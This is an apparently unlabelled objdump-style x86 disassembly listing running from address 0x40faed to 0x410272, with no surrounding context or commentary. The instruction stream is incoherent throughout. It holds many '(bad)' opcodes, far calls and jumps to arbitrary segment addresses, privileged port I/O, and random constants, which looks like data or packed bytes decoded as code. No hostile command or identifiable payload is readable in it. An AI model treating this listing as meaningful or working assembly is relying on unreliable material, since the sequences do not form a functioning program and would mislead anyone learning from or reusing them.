  40faed:	xor    BYTE PTR ds:0x89f17fac,al
  40faf3:	pop    eax
  40faf4:	lahf   
  40faf5:	cmp    al,0x9a
  40faf7:	mov    esp,0xccbd038f
  40fafc:	retf   0x6b4f
  40faff:	pushf  
  40fb00:	ror    BYTE PTR ds:0x86da04d1,cl
  40fb06:	stc    
  40fb07:	xor    edi,ebx
  40fb09:	call   0x8e1a:0xc0509f13
  40fb10:	adc    eax,0xbce028c9
  40fb15:	jo     0x40fb77
  40fb17:	shr    ch,1
  40fb19:	push   edx
  40fb1a:	cs inc esi
  40fb1c:	(bad)  
  40fb1d:	jne    0x40fb23
  40fb1f:	sar    BYTE PTR [eax+0x27],1
  40fb22:	aad    0x1a
  40fb24:	push   esi
  40fb25:	ins    DWORD PTR es:[edi],dx
  40fb26:	xchg   ah,bl
  40fb28:	ja     0x40faf1
  40fb2a:	sbb    BYTE PTR [ebx],ah
  40fb2c:	pusha  
  40fb2d:	dec    ecx
  40fb2e:	jmp    0xc774:0x462079c2
  40fb35:	push   ss
  40fb36:	xchg   ebx,eax
  40fb37:	inc    esp
  40fb38:	in     eax,0x36
  40fb3a:	dec    ebx
  40fb3b:	stc    
  40fb3c:	xor    BYTE PTR [eax*8+0x4602c5a9],0xab
  40fb44:	sbb    eax,0x105dae16
  40fb49:	xlat   BYTE PTR ds:[ebx]
  40fb4a:	cdq    
  40fb4b:	xchg   ebx,eax
  40fb4c:	stos   DWORD PTR es:[edi],eax
  40fb4d:	fcomp  DWORD PTR [esi+ecx*1]
  40fb50:	jge    0x40fb45
  40fb52:	push   edx
  40fb53:	popf   
  40fb54:	sub    al,bl
  40fb56:	cmp    eax,0xdfdb6357
  40fb5b:	mov    ebx,0xc61c33ae
  40fb60:	xor    al,0x81
  40fb62:	(bad)  
  40fb63:	fistp  QWORD PTR [esi+0x128fc622]
  40fb69:	fist   WORD PTR [edx]
  40fb6b:	loopne 0x40fb29
  40fb6d:	setne  BYTE PTR [eax+ebx*1+0x46522530]
  40fb75:	xchg   edx,eax
  40fb76:	icebp  
  40fb77:	out    0xf7,eax
  40fb79:	(bad)  
  40fb7a:	(bad)  
  40fb7b:	cwde   
  40fb7c:	call   0x1c23:0xe5036c7b
  40fb83:	lahf   
  40fb84:	rcr    cl,0xdb
  40fb87:	cmp    eax,0x3a5fcf3a
  40fb8c:	mov    ebx,0x83b00b4a
  40fb91:	sub    eax,0x1f122c04
  40fb96:	pop    ss
  40fb97:	sahf   
  40fb98:	xlat   BYTE PTR ds:[ebx]
  40fb99:	jo     0x40fb81
  40fb9b:	mul    BYTE PTR [ebx]
  40fb9d:	sahf   
  40fb9e:	inc    esp
  40fb9f:	dec    ebx
  40fba0:	lods   al,BYTE PTR ds:[esi]
  40fba1:	cli    
  40fba2:	cld    
  40fba3:	test   eax,0x2262b56a
  40fba8:	jg     0x40fb92
  40fbaa:	cmp    al,0x77
  40fbac:	call   0x65ab:0x15c91333
  40fbb3:	loopne 0x40fc28
  40fbb5:	mov    edi,0x6a946b91
  40fbba:	push   eax
  40fbbb:	outs   dx,BYTE PTR ds:[esi]
  40fbbc:	and    dl,ch
  40fbbe:	sub    DWORD PTR [ebx+0x5cde3522],edi
  40fbc4:	ret    
  40fbc5:	cli    
  40fbc6:	loop   0x40fb91
  40fbc8:	mov    edx,0x5fcc4113
  40fbcd:	adc    BYTE PTR [esi],0x11
  40fbd0:	mov    dl,0x7a
  40fbd2:	jno    0x40fbc9
  40fbd4:	inc    esi
  40fbd5:	mov    ebx,0x9789bfd1
  40fbda:	(bad)  
  40fbdb:	push   0xaa2ed86f
  40fbe0:	jecxz  0x40fbf6
  40fbe2:	std    
  40fbe3:	mov    dh,0x6e
  40fbe5:	xchg   ebp,eax
  40fbe6:	inc    eax
  40fbe7:	dec    ebp
  40fbe8:	push   ebx
  40fbe9:	rol    BYTE PTR [ecx-0xa],0x70
  40fbed:	sbb    DWORD PTR [ebx+0x50],eax
  40fbf0:	sar    BYTE PTR [ebp+0x17df718b],cl
  40fbf6:	jbe    0x40fc73
  40fbf8:	pop    ss
  40fbf9:	dec    edx
  40fbfa:	pop    ebp
  40fbfb:	push   ebp
  40fbfc:	sbb    DWORD PTR [edx+0x793a7602],0xffffff81
  40fc03:	and    DWORD PTR [ecx],ecx
  40fc05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc06:	mov    edi,0xd6e74b7
  40fc0b:	xchg   DWORD PTR [ebx+0x71],eax
  40fc0e:	data16 jo 0x40fc27
  40fc11:	stos   DWORD PTR es:[edi],eax
  40fc12:	jno    0x40fb97
  40fc14:	xchg   edx,eax
  40fc15:	ret    
  40fc16:	mov    al,ds:0x1af59867
  40fc1b:	ds in  al,0x9e
  40fc1e:	jbe    0x40fbc7
  40fc20:	inc    eax
  40fc21:	cld    
  40fc22:	jne    0x40fc34
  40fc24:	xchg   edi,eax
  40fc25:	stos   BYTE PTR es:[edi],al
  40fc26:	cmc    
  40fc27:	pop    esp
  40fc28:	pop    esp
  40fc29:	xchg   ecx,eax
  40fc2a:	and    al,0xa1
  40fc2c:	pushf  
  40fc2d:	or     bh,BYTE PTR [esi-0x2d]
  40fc30:	dec    edi
  40fc31:	cli    
  40fc32:	cs inc eax
  40fc34:	sub    BYTE PTR [ebp-0x92247e8],0x3a
  40fc3b:	mov    bh,0xe4
  40fc3d:	and    DWORD PTR [edx-0x76],ebp
  40fc40:	pop    DWORD PTR [ebx+0x5a377aea]
  40fc46:	add    ebx,DWORD PTR [esi+0x57]
  40fc49:	jno    0x40fcbd
  40fc4b:	aad    0xb2
  40fc4d:	and    bh,cl
  40fc4f:	pop    esp
  40fc50:	in     al,dx
  40fc51:	ds and esi,edi
  40fc54:	mov    ds:0x97cf2ac0,al
  40fc59:	ss xor eax,0x744113fa
  40fc5f:	adc    ch,BYTE PTR [esp+eax*8+0x19]
  40fc63:	in     eax,0x8c
  40fc65:	outs   dx,DWORD PTR ds:[esi]
  40fc66:	lods   al,BYTE PTR ds:[esi]
  40fc67:	xor    eax,0x2924e195
  40fc6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc6d:	mov    cl,0x6e
  40fc6f:	adc    esi,esi
  40fc71:	dec    ebx
  40fc72:	popa   
  40fc73:	out    dx,al
  40fc74:	sub    DWORD PTR [ebp+0x8],edx
  40fc77:	popa   
  40fc78:	xchg   edx,eax
  40fc79:	add    DWORD PTR [edi],ebx
  40fc7b:	xchg   ecx,eax
  40fc7c:	test   BYTE PTR [edi-0x6d],0x1
  40fc80:	out    0x9a,eax
  40fc82:	popf   
  40fc83:	hlt    
  40fc84:	js     0x40fc48
  40fc86:	push   ebx
  40fc87:	xor    BYTE PTR [edi+0x671fd625],dl
  40fc8d:	fdivr  st(7),st
  40fc8f:	push   esi
  40fc90:	fldenv [ebx-0x51681a31]
  40fc96:	cmp    eax,edx
  40fc98:	push   ebp
  40fc99:	xor    BYTE PTR [edi],ch
  40fc9b:	jge    0x40fc68
  40fc9d:	test   ah,dl
  40fc9f:	inc    eax
  40fca0:	shr    DWORD PTR ds:0x71d146e8,cl
  40fca6:	and    al,BYTE PTR [ecx-0x10a1be10]
  40fcac:	jmp    0xee99:0x1c3bb8d5
  40fcb3:	sub    eax,0x524cd3e1
  40fcb8:	and    eax,0x986115be
  40fcbd:	in     eax,0xcd
  40fcbf:	rcl    ah,0x2e
  40fcc2:	push   0xffffffa7
  40fcc4:	cmp    ebx,ebx
  40fcc6:	mov    bh,0x2d
  40fcc8:	and    al,0xa7
  40fcca:	and    ecx,DWORD PTR [esi]
  40fccc:	xor    eax,0xd985fd9a
  40fcd1:	cmp    al,BYTE PTR [ecx+0x3509ce2e]
  40fcd7:	push   0xd8e416f5
  40fcdc:	cmp    BYTE PTR [edi+0x6d],dl
  40fcdf:	mov    al,ds:0xf13230be
  40fce4:	sti    
  40fce5:	shl    BYTE PTR [esi+0xe],1
  40fce8:	lods   eax,DWORD PTR ds:[esi]
  40fce9:	ins    BYTE PTR es:[edi],dx
  40fcea:	add    esi,DWORD PTR [edx+0x49]
  40fced:	int3   
  40fcee:	dec    ebp
  40fcef:	mov    dh,0xd
  40fcf1:	inc    edi
  40fcf2:	pop    eax
  40fcf3:	dec    ebx
  40fcf4:	cdq    
  40fcf5:	shl    BYTE PTR [edi+0x5e],1
  40fcf8:	adc    bh,BYTE PTR ds:0xa40ba68e
  40fcfe:	les    ebp,FWORD PTR [edi-0x4762aec2]
  40fd04:	xchg   edi,eax
  40fd05:	push   cs
  40fd06:	push   ds
  40fd07:	fmul   st(4),st
  40fd09:	stos   BYTE PTR es:[edi],al
  40fd0a:	out    dx,eax
  40fd0b:	cmc    
  40fd0c:	retf   0x8ce4
  40fd0f:	dec    ecx
  40fd10:	imul   esi,DWORD PTR ds:0x878e,0xffffffd1
  40fd16:	adc    al,dh
  40fd18:	aas    
  40fd19:	fdivr  DWORD PTR [edi+0x70]
  40fd1c:	inc    eax
  40fd1d:	ds xchg edi,eax
  40fd1f:	jbe    0x40fcc2
  40fd21:	jae    0x40fd40
  40fd23:	mov    ch,bh
  40fd25:	not    DWORD PTR [ecx+ebx*4+0x2c]
  40fd29:	imul   DWORD PTR [edx+eiz*1+0x7ef619a9]
  40fd30:	mov    BYTE PTR [esi-0x34],dh
  40fd33:	mov    ecx,0x599b26ff
  40fd38:	lods   al,BYTE PTR ds:[esi]
  40fd39:	or     BYTE PTR [ecx+ebx*1],bl
  40fd3c:	adc    al,0xee
  40fd3e:	dec    ebp
  40fd3f:	nop
  40fd40:	idiv   DWORD PTR [ebx]
  40fd42:	test   DWORD PTR [esi+0x78],ebx
  40fd45:	int    0x69
  40fd47:	push   es
  40fd48:	clc    
  40fd49:	(bad)  
  40fd4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd4c:	cld    
  40fd4d:	jp     0x40fcf3
  40fd4f:	setl   BYTE PTR [esi-0x42]
  40fd53:	sbb    DWORD PTR [esi],ebx
  40fd55:	call   0xdaad5cb1
  40fd5a:	push   ds
  40fd5b:	aaa    
  40fd5c:	mov    ds:0x4a95b34f,al
  40fd61:	fwait
  40fd62:	lds    esi,FWORD PTR [esi]
  40fd64:	call   0x22a0d232
  40fd69:	xchg   edx,eax
  40fd6a:	ins    DWORD PTR es:[edi],dx
  40fd6b:	fwait
  40fd6c:	daa    
  40fd6d:	loope  0x40fdda
  40fd6f:	adc    DWORD PTR [esi],eax
  40fd71:	fldenv [ebp+eiz*2+0x3e77c2fe]
  40fd78:	dec    eax
  40fd79:	or     eax,0x77768c9e
  40fd7e:	sub    dl,BYTE PTR [esi]
  40fd80:	pop    ecx
  40fd81:	push   esp
  40fd82:	cmp    ebp,DWORD PTR [ecx]
  40fd84:	pushf  
  40fd85:	and    eax,0x4cc1c746
  40fd8a:	out    0x5a,eax
  40fd8c:	in     al,0xf3
  40fd8e:	ret    0xbd5d
  40fd91:	in     eax,0xb9
  40fd93:	xchg   edi,eax
  40fd94:	pop    edi
  40fd95:	xor    ebp,DWORD PTR [ebx-0x56]
  40fd98:	fadd   DWORD PTR [edx]
  40fd9a:	test   DWORD PTR [esi-0x662dd43a],esp
  40fda0:	jle    0x40fd44
  40fda2:	sbb    edx,edi
  40fda4:	popa   
  40fda5:	xchg   edi,eax
  40fda6:	jns    0x40fdae
  40fda8:	push   0x877e752a
  40fdad:	iret   
  40fdae:	aad    0x2b
  40fdb0:	mov    al,0x2d
  40fdb2:	mov    cl,0x99
  40fdb4:	dec    ecx
  40fdb5:	dec    ebx
  40fdb6:	xlat   BYTE PTR ds:[ebx]
  40fdb7:	pop    edi
  40fdb8:	and    ah,BYTE PTR [edi]
  40fdba:	pop    ecx
  40fdbb:	bnd jp 0x40fda2
  40fdbe:	xlat   BYTE PTR ds:[ebx]
  40fdbf:	ds jle 0x40fdfd
  40fdc2:	std    
  40fdc3:	rol    BYTE PTR [eax],1
  40fdc5:	or     BYTE PTR [eax],bl
  40fdc7:	mov    ah,BYTE PTR [esi+0x4]
  40fdca:	jb     0x40fd8b
  40fdcc:	leave  
  40fdcd:	push   esi
  40fdce:	push   es
  40fdcf:	add    cl,BYTE PTR [ebx-0x18]
  40fdd2:	ret    0x54f9
  40fdd5:	(bad)
  40fdd8:	xchg   edi,eax
  40fdd9:	std    
  40fdda:	sbb    al,0x95
  40fddc:	cmp    eax,0x175d4d96
  40fde1:	mov    BYTE PTR [edi-0x2faf68b7],cl
  40fde7:	add    al,0x9c
  40fde9:	adc    esi,DWORD PTR [edx+eiz*4+0x0]
  40fded:	fst    QWORD PTR [edi+0xb]
  40fdf0:	or     esp,ecx
  40fdf2:	xor    ch,BYTE PTR [ecx]
  40fdf4:	hlt    
  40fdf5:	add    eax,0x1815c19d
  40fdfa:	popf   
  40fdfb:	int    0x24
  40fdfd:	cmc    
  40fdfe:	stos   DWORD PTR es:[edi],eax
  40fdff:	push   esp
  40fe00:	or     BYTE PTR [esi],ah
  40fe02:	pop    esi
  40fe03:	scas   eax,DWORD PTR es:[edi]
  40fe04:	aad    0xc7
  40fe06:	sub    BYTE PTR [esp+ebp*1],ch
  40fe09:	or     DWORD PTR [edi],ebx
  40fe0b:	xor    BYTE PTR [esi-0xa03d29b],ch
  40fe11:	pop    ss
  40fe12:	or     DWORD PTR ds:0x660e3af6,esi
  40fe18:	inc    edi
  40fe19:	jg     0x40fdc2
  40fe1b:	rcl    DWORD PTR [ebx],0x16
  40fe1e:	test   BYTE PTR [ecx-0x59e11969],bh
  40fe24:	jmp    0x579d:0xdf271d84
  40fe2b:	add    eax,0xb69262f0
  40fe30:	sub    bh,BYTE PTR [esp+esi*1]
  40fe33:	inc    esi
  40fe34:	(bad)  
  40fe36:	sub    al,0x42
  40fe38:	add    eax,0x90ab7724
  40fe3d:	lea    esi,ds:0x60c87552
  40fe43:	add    eax,0x3be59660
  40fe48:	popf   
  40fe49:	adc    dl,BYTE PTR [edi+0x4bb3cf15]
  40fe4f:	jmp    0x8b13:0xc9be9df2
  40fe56:	pop    ecx
  40fe57:	xlat   BYTE PTR ds:[ebx]
  40fe58:	push   es
  40fe59:	mov    DWORD PTR [edi-0x1e4d33f7],ecx
  40fe5f:	(bad)  
  40fe60:	fidiv  DWORD PTR [edx-0x3d]
  40fe63:	mov    bh,BYTE PTR [edi+0x29]
  40fe66:	fnstsw WORD PTR [edi+0x67]
  40fe69:	out    0xa3,eax
  40fe6b:	dec    eax
  40fe6c:	out    0xb6,eax
  40fe6e:	lock jecxz 0x40febd
  40fe71:	cld    
  40fe72:	inc    ecx
  40fe73:	sbb    ah,bl
  40fe75:	mov    cl,0xda
  40fe77:	and    DWORD PTR [ecx+ecx*1],esi
  40fe7a:	inc    ebx
  40fe7b:	in     eax,dx
  40fe7c:	js     0x40fe13
  40fe7e:	test   DWORD PTR [edi],ebx
  40fe80:	adc    edx,ebp
  40fe82:	push   ebx
  40fe83:	pop    ebx
  40fe84:	clc    
  40fe85:	push   ds
  40fe86:	cmp    BYTE PTR [ebx],ch
  40fe88:	xor    al,0x62
  40fe8a:	push   ebp
  40fe8b:	inc    ebp
  40fe8c:	sub    edx,DWORD PTR [esi]
  40fe8e:	in     eax,0xe9
  40fe90:	fist   DWORD PTR [esi]
  40fe92:	aaa    
  40fe93:	rcr    DWORD PTR [esi+edi*8+0x42254a48],cl
  40fe9a:	iret   
  40fe9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe9c:	mov    bl,0xe8
  40fe9e:	adc    ch,dl
  40fea0:	dec    esp
  40fea1:	dec    ecx
  40fea2:	jno    0x40fe5c
  40fea4:	fldcw  WORD PTR [ebx-0x35]
  40fea7:	aad    0xd2
  40fea9:	mov    cl,0xc5
  40feab:	sbb    eax,0x7b477926
  40feb0:	(bad)  
  40feb1:	dec    esp
  40feb2:	mov    al,es:0x265fbedf
  40feb8:	inc    edx
  40feb9:	fistp  QWORD PTR [eax]
  40febb:	add    al,0xa1
  40febd:	mov    ds:0xa945a894,al
  40fec2:	sahf   
  40fec3:	pusha  
  40fec4:	call   0xc10d2d10
  40fec9:	mov    ebp,0xcc6bde1a
  40fece:	and    DWORD PTR [edx+0x68],ebp
  40fed1:	xchg   ebx,eax
  40fed2:	and    BYTE PTR [edi],bh
  40fed4:	mov    ecx,0xc3d5151f
  40fed9:	icebp  
  40feda:	adc    eax,0xf4c43069
  40fedf:	test   eax,0x4a2f8552
  40fee4:	xchg   edi,eax
  40fee5:	mov    esp,0x30d13357
  40feea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40feeb:	loope  0x40ff5c
  40feed:	or     al,0xb1
  40feef:	mov    cl,0x4d
  40fef1:	push   esi
  40fef2:	arpl   WORD PTR [ebp+0x6f566694],ax
  40fef8:	loop   0x40ff45
  40fefa:	lock (bad) 
  40fefd:	dec    edi
  40fefe:	loop   0x40ff3b
  40ff00:	jae    0x40feed
  40ff02:	popf   
  40ff03:	stos   DWORD PTR es:[edi],eax
  40ff04:	mov    eax,ds:0x3aeba1ba
  40ff09:	jno    0x40ff33
  40ff0b:	stc    
  40ff0c:	(bad)  
  40ff0d:	test   DWORD PTR ds:0x7047f28b,0xa59869c3
  40ff17:	push   cs
  40ff18:	add    edx,ebx
  40ff1a:	loopne 0x40fef6
  40ff1c:	test   BYTE PTR [ecx+edx*8-0xeb1bddb],ch
  40ff23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff24:	pop    ebp
  40ff25:	mov    eax,0xd56f0309
  40ff2a:	push   ebp
  40ff2b:	mov    edi,0x602d36ea
  40ff30:	adc    cl,ch
  40ff32:	dec    edi
  40ff33:	jmp    0xf9213666
  40ff38:	mov    bh,cl
  40ff3a:	iret   
  40ff3b:	sub    eax,DWORD PTR [ebp-0x49]
  40ff3e:	loopne 0x40ff1e
  40ff40:	sti    
  40ff41:	cmp    al,0x8f
  40ff43:	cli    
  40ff44:	jo     0x40ffc0
  40ff46:	cmp    al,0xce
  40ff48:	xchg   edi,eax
  40ff49:	aas    
  40ff4a:	jno    0x40ffb3
  40ff4c:	adc    edx,DWORD PTR [eax-0x5e]
  40ff4f:	or     ah,bl
  40ff51:	mov    ds:0xec32fde7,eax
  40ff56:	lahf   
  40ff57:	or     al,0xb5
  40ff59:	push   0x21
  40ff5b:	stos   BYTE PTR es:[edi],al
  40ff5c:	mov    dl,0x4d
  40ff5e:	sbb    dl,dl
  40ff60:	fwait
  40ff61:	sbb    cl,BYTE PTR [edi+0x4c6c6309]
  40ff67:	or     BYTE PTR [edi-0x1813e5dd],bh
  40ff6d:	loope  0x40ff4c
  40ff6f:	ffree  st(1)
  40ff71:	or     al,BYTE PTR [esi+0x7c1d54b9]
  40ff77:	imul   esi,DWORD PTR [ecx-0x7c],0x2e
  40ff7b:	add    BYTE PTR [esp+eax*2+0x2f],bh
  40ff7f:	xor    DWORD PTR [ebx],edi
  40ff81:	pop    ecx
  40ff82:	jl     0x40ff3e
  40ff84:	mov    esi,0x4c6c9b67
  40ff89:	pusha  
  40ff8a:	mov    al,ds:0x4ad3f4c0
  40ff8f:	pop    eax
  40ff90:	rcl    DWORD PTR [eax-0xbdceac6],0xba
  40ff97:	fidivr WORD PTR [esi]
  40ff99:	sti    
  40ff9a:	ins    DWORD PTR es:[edi],dx
  40ff9b:	js     0x40ff87
  40ff9d:	cmp    DWORD PTR [edi+eax*8-0x6a1c3430],ebp
  40ffa4:	add    eax,0xddcb6687
  40ffa9:	mul    DWORD PTR [edi+0x1628f88f]
  40ffaf:	outs   dx,DWORD PTR ds:[esi]
  40ffb0:	cs ror ah,0x86
  40ffb4:	out    dx,al
  40ffb5:	dec    ebp
  40ffb6:	inc    eax
  40ffb7:	inc    ebx
  40ffb8:	xor    BYTE PTR [esp+eax*4+0x4fcda196],ah
  40ffbf:	mul    DWORD PTR [eax-0x1f]
  40ffc2:	inc    eax
  40ffc3:	mov    ch,0x92
  40ffc5:	and    al,0xf2
  40ffc7:	outs   dx,DWORD PTR ds:[esi]
  40ffc8:	out    0x20,eax
  40ffca:	aaa    
  40ffcb:	and    edx,0x1a
  40ffce:	icebp  
  40ffcf:	sub    DWORD PTR [esi-0x28],ebp
  40ffd2:	sbb    ebp,ecx
  40ffd4:	cmp    DWORD PTR [eax+ebp*4-0x2a],ebp
  40ffd8:	push   eax
  40ffd9:	mov    edi,0xd6862e18
  40ffde:	mov    dh,0xa4
  40ffe0:	imul   edx,DWORD PTR [edx],0xffffff9b
  40ffe3:	in     al,0x8e
  40ffe5:	pop    eax
  40ffe6:	push   edi
  40ffe7:	push   ecx
  40ffe8:	push   ds
  40ffe9:	and    BYTE PTR [ebx+0x53e1dfb4],0xba
  40fff0:	jp     0x40ffd6
  40fff2:	neg    ah
  40fff4:	mov    esp,0x12f48c43
  40fff9:	mov    esi,0x5f6a1913
  40fffe:	mov    ch,0x7
  410000:	mov    esi,0x14edfb23
  410005:	sahf   
  410006:	jmp    0x40ffc8
  410008:	cmp    cl,dl
  41000a:	ror    al,0x44
  41000d:	xchg   BYTE PTR [ecx+eiz*1-0x26c1006a],dh
  410014:	rcr    DWORD PTR [edx+0x7f],1
  410017:	lods   al,BYTE PTR ds:[esi]
  410018:	xor    eax,DWORD PTR [edi-0x7b]
  41001b:	repz dec edi
  41001d:	ins    BYTE PTR es:[edi],dx
  41001e:	(bad)  
  41001f:	and    bh,BYTE PTR [ebp-0x29bad9ac]
  410025:	sub    eax,0xd52f5a9
  41002a:	dec    esi
  41002b:	mov    eax,0xcfd130d7
  410030:	fisub  DWORD PTR [edi+eax*2+0x9]
  410034:	stos   BYTE PTR es:[edi],al
  410035:	mov    esp,0xe878852c
  41003a:	dec    ecx
  41003b:	hlt    
  41003c:	jmp    0x94f2979b
  410041:	call   0x3256133c
  410046:	mov    ebx,0xe0b7441a
  41004b:	mov    esp,DWORD PTR [ebx+0x2d14e312]
  410051:	iret   
  410052:	sbb    DWORD PTR ds:0x619fe2c6,0x55
  410059:	sub    al,0x62
  41005b:	fidiv  WORD PTR [ecx-0x143ea051]
  410061:	mov    cl,0x84
  410063:	loopne 0x41005d
  410065:	shr    bh,0xe7
  410068:	mov    ecx,DWORD PTR [ecx-0x60]
  41006b:	mov    BYTE PTR [esi],dl
  41006d:	test   edx,ebp
  41006f:	mov    ds:0xe3f4952a,al
  410074:	lea    eax,[edi-0x512f62f2]
  41007a:	or     bh,BYTE PTR [edx+0x57e06557]
  410080:	sar    BYTE PTR [ecx-0x74c800dd],0xf2
  410087:	and    eax,esi
  410089:	and    bl,al
  41008b:	shr    DWORD PTR [edx-0x140b4c21],cl
  410091:	lods   eax,DWORD PTR ds:[esi]
  410092:	ds sar BYTE PTR fs:[esi+0x2b],1
  410097:	add    al,0x22
  410099:	daa    
  41009a:	repz sbb bl,BYTE PTR [ebp-0x18271ba2]
  4100a1:	jle    0x4100f8
  4100a3:	and    cl,BYTE PTR [edx+eiz*8+0x68]
  4100a7:	cmp    bl,BYTE PTR [eax]
  4100a9:	mov    al,ds:0x1f541b63
  4100ae:	or     esi,DWORD PTR [edx+eax*8-0x678a0efb]
  4100b5:	rcr    BYTE PTR [ebx],0x3c
  4100b8:	xlat   BYTE PTR fs:[ebx]
  4100ba:	push   ebx
  4100bb:	mov    esp,ebp
  4100bd:	add    bl,BYTE PTR [edx+eax*8-0x57]
  4100c1:	sub    eax,0xd92baebe
  4100c6:	test   BYTE PTR [esi+0x1b],cl
  4100c9:	ins    BYTE PTR es:[edi],dx
  4100ca:	inc    ebx
  4100cb:	jmp    0x41008d
  4100cd:	out    dx,eax
  4100ce:	in     eax,0xa9
  4100d0:	pop    ecx
  4100d1:	les    esi,FWORD PTR ds:0xbe7948a9
  4100d7:	push   0xffffffa7
  4100d9:	inc    edi
  4100da:	in     eax,dx
  4100db:	xchg   ebx,eax
  4100dc:	add    eax,DWORD PTR [ebp-0x2]
  4100df:	add    al,0x1f
  4100e1:	lock out dx,al
  4100e3:	std    
  4100e4:	adc    ebx,DWORD PTR [esi+0x654d7f52]
  4100ea:	or     edx,DWORD PTR [ebp+0x3a]
  4100ed:	repnz dec esi
  4100ef:	inc    edx
  4100f0:	jae    0x4100b9
  4100f2:	test   ebp,0xa8cfc986
  4100f8:	(bad)  
  4100f9:	fisttp DWORD PTR [ecx]
  4100fb:	aaa    
  4100fc:	mov    dl,0xb2
  4100fe:	(bad)
  410101:	add    edx,ebx
  410103:	fisubr DWORD PTR [edi+0x67]
  410106:	push   ebp
  410107:	cmp    eax,0xfdd4cdc7
  41010c:	push   cs
  41010d:	mov    cl,0x1e
  41010f:	popa   
  410110:	add    al,0xf9
  410112:	adc    al,0xf4
  410114:	inc    edi
  410115:	push   cs
  410116:	not    al
  410118:	cdq    
  410119:	out    0xb7,al
  41011b:	mov    ch,0x3b
  41011d:	inc    eax
  41011e:	push   ecx
  41011f:	dec    edi
  410120:	outs   dx,DWORD PTR ds:[esi]
  410122:	enter  0x76a6,0xb0
  410126:	out    dx,eax
  410127:	mov    edi,0xb2a3aece
  41012c:	rcl    eax,0x53
  41012f:	pop    ebp
  410130:	(bad)  
  410131:	nop
  410132:	lods   eax,DWORD PTR ds:[esi]
  410133:	aaa    
  410134:	xor    BYTE PTR [edi-0x4eda107e],ah
  41013a:	fisubr DWORD PTR [eax-0x5f]
  41013d:	test   ax,0x886c
  410141:	inc    esp
  410142:	pop    edx
  410143:	sti    
  410144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410145:	mov    ebx,DWORD PTR [esi+0x6e]
  410148:	adc    esp,ecx
  41014a:	mov    al,ds:0x7bbd8499
  41014f:	xor    BYTE PTR [esi+ebp*1+0x2],0xca
  410154:	out    dx,al
  410155:	js     0x41010f
  410157:	mov    edi,0xe71d71ef
  41015c:	rol    BYTE PTR [esp+eax*8-0x7d6409ce],1
  410163:	shl    DWORD PTR [ebx-0x39d8ed4a],0x1f
  41016a:	jne    0x41016d
  41016c:	and    bl,BYTE PTR [eax+0x44]
  41016f:	out    0x24,al
  410171:	pop    esp
  410172:	mov    al,BYTE PTR [ecx+0x7a]
  410175:	stos   DWORD PTR es:[edi],eax
  410176:	jl     0x410175
  410178:	mov    esp,0xd5628f82
  41017d:	pop    ecx
  41017e:	fxch   st(5)
  410180:	std    
  410181:	dec    ecx
  410182:	scas   eax,DWORD PTR es:[edi]
  410183:	test   al,0xb8
  410185:	mov    cl,0xbb
  410187:	xchg   ebx,eax
  410188:	sbb    al,0x27
  41018a:	add    DWORD PTR [esi-0x98477df],ebx
  410190:	pop    ecx
  410191:	test   BYTE PTR [esi+0x1fa1c4c4],ch
  410197:	in     al,dx
  410198:	sbb    DWORD PTR [esi],esi
  41019a:	(bad)  
  41019b:	push   esi
  41019c:	push   ecx
  41019d:	sar    DWORD PTR [ebx],1
  41019f:	pop    DWORD PTR [esi+0x248b54de]
  4101a5:	or     al,0xdd
  4101a7:	mov    eax,0x32dca454
  4101ac:	xor    ebp,eax
  4101ae:	adc    ch,0x4e
  4101b1:	xor    DWORD PTR [ebx+ebx*8+0x2c],0xffffffd2
  4101b6:	imul   eax,ecx,0x105b57f7
  4101bc:	fistp  DWORD PTR [eax]
  4101be:	mov    esi,0xd885ce3d
  4101c3:	inc    edi
  4101c4:	jmp    0x5bebc8a9
  4101c9:	(bad)  
  4101ca:	cmp    ch,BYTE PTR ds:[edi+0x5d]
  4101ce:	pusha  
  4101cf:	mov    ecx,DWORD PTR [ebp-0x63]
  4101d2:	ret    0xd03b
  4101d5:	(bad)  
  4101d6:	(bad)  
  4101d7:	cmp    ah,BYTE PTR [eax+ebx*1]
  4101da:	mov    ds:0x85ad8343,al
  4101df:	mov    ebx,ss
  4101e1:	pusha  
  4101e2:	sar    DWORD PTR [ecx-0x5f4e600f],0xfd
  4101e9:	(bad)  
  4101ea:	adc    bh,BYTE PTR [ecx+ebp*4+0x25]
  4101ee:	std    
  4101ef:	push   0xfffffff5
  4101f1:	mov    ds:0x92c4406b,al
  4101f6:	pop    ebp
  4101f7:	push   ecx
  4101f8:	add    al,0x29
  4101fa:	ja     0x4101b6
  4101fc:	push   es
  4101fd:	fsubp  st(7),st
  4101ff:	mov    WORD PTR [eax+0x45],fs
  410202:	rcl    dl,0xa6
  410205:	(bad)  
  410206:	aad    0xa3
  410208:	pusha  
  410209:	and    BYTE PTR [esi+0x578cb5e4],0x10
  410210:	les    ecx,FWORD PTR [edx+0x7591126b]
  410216:	push   es
  410217:	and    BYTE PTR [ecx],bh
  410219:	sbb    BYTE PTR [ebx],0xa6
  41021c:	lock jp 0x410210
  41021f:	jne    0x410293
  410221:	jge    0x410292
  410223:	sbb    eax,0xfab550f1
  410228:	(bad)  
  410229:	fbstp  TBYTE PTR [esi]
  41022b:	xor    ebx,edx
  41022d:	push   0x57
  41022f:	mov    ch,0xff
  410231:	das    
  410232:	shl    DWORD PTR [edi+0x3f451cad],0x71
  410239:	sub    al,0xbd
  41023b:	out    dx,eax
  41023c:	lods   al,BYTE PTR ds:[esi]
  41023d:	out    0x71,eax
  41023f:	add    al,0xb1
  410241:	inc    ebx
  410242:	mov    al,ds:0xba8d211e
  410247:	inc    ecx
  410248:	jl     0x410289
  41024a:	sar    DWORD PTR [edi+0x9],0x57
  41024e:	in     al,0xe7
  410250:	test   DWORD PTR [esi-0x4a],edi
  410253:	imul   edx,edx,0x87c5a1cf
  410259:	and    dl,BYTE PTR [ecx+eiz*1]
  41025c:	imul   edx,esp,0xffffffad
  41025f:	ins    BYTE PTR es:[edi],dx
  410260:	inc    esi
  410261:	jmp    0xaf8c0151
  410266:	mov    bl,0xc5
  410268:	repz dec BYTE PTR [ecx-0x6e063ee5]
  41026f:	xchg   edx,eax
  410270:	inc    edx
  410271:	push   es
  410272:	leave  
